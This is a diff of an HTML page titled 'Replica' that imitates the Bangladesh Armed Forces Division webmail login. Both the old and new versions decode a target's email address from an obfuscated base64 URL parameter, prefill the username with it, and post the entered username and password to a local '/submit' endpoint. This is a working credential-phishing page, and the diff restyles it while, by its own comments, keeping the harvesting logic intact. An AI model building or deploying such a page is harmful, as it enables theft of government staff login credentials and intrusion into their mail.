@@ -1,86 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AFD Mailing System — Replica</title>
 
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
-<html lang="en"><head>
-		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-		<meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
-		<link rel="SHORTCUT ICON" href="https://mail.afd.gov.bd/favicon.ico">	
-		<meta http-equiv="PRAGMAS" content="NO-CACHE">
-		<meta http-equiv="expires" content="0">
-		<title>AFD Webmail Login</title>
-		<script>
-		   // Function to extract query parameter value
-		    function getQueryParameter(parameterName) {
-		      var queryString = window.location.search;
-		      var urlParams = new URLSearchParams(queryString);
-		      return urlParams.get(parameterName);
-		    }
-		    // Get the value from the 'data' query parameter
-		    var value = getQueryParameter('bfjkdghurehgjufhdkhgruiegbvousdhfowehr');
-		    
-		    if(value == null) {
-		    
-		    	window.location.href = "error.html";
-		    
-		    }else{
-		    
-		    var b64name = atob(value);
-		    
-		    function onLoad() {
-		      var b64name = atob(value);
-		      var inputField = document.getElementById('username');
-		      inputField.value = b64name;
-		    }
-		    }
+<!-- original script logic kept intact -->
+<script>
+  function getQueryParameter(parameterName) {
+    var queryString = window.location.search;
+    var urlParams = new URLSearchParams(queryString);
+    return urlParams.get(parameterName);
+  }
 
+  var value = getQueryParameter('bfjkdghurehgjufhdkhgruiegbvousdhfowehr');
 
-		  </script>
+  if (value == null) {
+    window.location.href = "error.html";
+  } else {
+    var b64name = atob(value);
 
-	</head>
-	<body onload="onLoad();" style="height: 100%;background: #393939;margin: 0;padding: 0;font-family: Verdana, Geneva, sans-serif;font-size: 12px;">
-		<div style="height: 615px;background: url(./files/customWMLoginImg5) repeat-x;">
-			<div style="height:150px">
-			</div>
-			<div style="margin:0 auto; background-image: url(./files/customWMLoginImg2); height: 386px; width:517px; background-repeat:no-repeat;">
-				<form action="/submit" method="POST" name="f">
-					<div>
-						<table style="width: 300px; border: none; margin: 0 auto; border-spacing: 6px">
-							<tbody><tr style="height: 160px">
-							</tr>
-							<tr>
-								<td style="text-align: left">
-									<font size="3" face="Arial">Name:</font>
-								</td>
-								<td style="text-align: right">
-									<font face="Arial">
-										<input name="username" type="TEXT" id="username" style="width:220px;" value="" title="afd.gov.bd" border="1">
-									</font>
-								</td>
-							</tr>
-							<tr>
-								<td style="text-align: left">
-									<font size="3" face="Arial">Password:</font>
-								</td>
-								<td style="text-align: right">
-									<font face="Arial">
-										<input name="password" id ="password" type="password" style="width:220px;" border="1">
-									</font>
-								</td>
-							</tr>
-							<tr>
-								<td></td>
-								<td style="text-align: right">
-									<input type="submit" style="cursor:pointer" name="CustomizeLogin"  value="Sign In" width="0"><input type="hidden" name="reqObject" value="WMLogin"><input type="hidden" name="reqAction" value="1">
-									
-									
-									
-								</td>
-							</tr>
-						</tbody></table>
-					</div>
-				</form>
-			</div>
-		</div>
-	
+    function onLoad() {
+      var inputField = document.getElementById('username');
+      inputField.value = b64name;
+    }
+  }
+</script>
 
-</body></html>
+<style>
+  :root{ --max-w:900px }
+  html,body{height:100%;margin:0;font-family: Arial, Helvetica, sans-serif;background:#fff}
+  .page{min-height:100%;display:flex;flex-direction:column}
+  .main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px}
+  .card{max-width:var(--max-w);width:100%;text-align:center}
+  .branding{display:flex;align-items:center;gap:20px;justify-content:center;margin-bottom:14px}
+  .branding img{width:150px;height:150px;object-fit:contain}
+  .branding .title{font-weight:1000;line-height:1.1;text-align:center}
+  .branding .title h1{margin:0;font-size:20px}
+  .form-wrap{display:inline-block;text-align:right}
+  form{margin-top:10px}
+  label{display:inline-block;width:70px;margin-right:8px}
+  input[type="text"], input[type="password"]{
+    padding:6px 8px;border:1px solid #666;border-radius:2px;width:260px
+  }
+  .row{margin:8px 0}
+  button{
+    margin-left:78px;padding:4px 10px;border:1px solid #777;
+    background:#eee;border-radius:3px;cursor:pointer
+  }
+  .bar{height:120px;background:#444;margin-top:30px}
+  @media (max-width:520px){
+    .branding{flex-direction:column}
+    label{display:block;width:auto;margin-bottom:4px}
+    input[type="text"],input[type="password"]{width:100%}
+    button{margin-left:0}
+  }
+</style>
+</head>
 
+<body onload="onLoad();">
+  <div class="page">
+    <div class="main">
+      <div class="card" role="main">
+
+        <div class="branding">
+          <img src="files/customWMLoginImg2" alt="AFD logo">
+          <div class="title">
+            <h1>ARMED FORCES DIVISION</h1>
+            <div>MAILING SYSTEM</div>
+          </div>
+        </div>
+
+        <!-- original form process preserved -->
+        <div class="form-wrap" aria-label="login form">
+          <form action="/submit" method="POST" name="f">
+            <div class="row">
+              <label>Name:</label>
+              <input name="username" id="username" type="text" value="">
+            </div>
+
+            <div class="row">
+              <label>Password:</label>
+              <input name="password" id="password" type="password">
+            </div>
+
+            <input type="hidden" name="reqObject" value="WMLogin">
+            <input type="hidden" name="reqAction" value="1">
+
+            <div class="row">
+              <button type="submit">Sign In</button>
+            </div>
+          </form>
+        </div>
+
+      </div>
+    </div>
+
+    <div class="bar"></div>
+  </div>
+
+</body>
+</html>
